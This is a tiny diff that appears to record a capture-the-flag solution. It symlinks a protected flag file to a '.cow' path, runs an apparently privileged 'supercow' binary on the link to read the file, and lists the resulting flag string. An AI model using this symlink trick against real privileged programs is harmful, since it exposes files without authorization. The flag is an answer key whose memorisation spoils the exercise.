@@ -1,0 +1,3 @@
+ln -s /home/daedalus/flag.txt ~/flag.cow
+/home/daedalus/supercow ~/flag.cow
+cows_drive_mooooving_vans
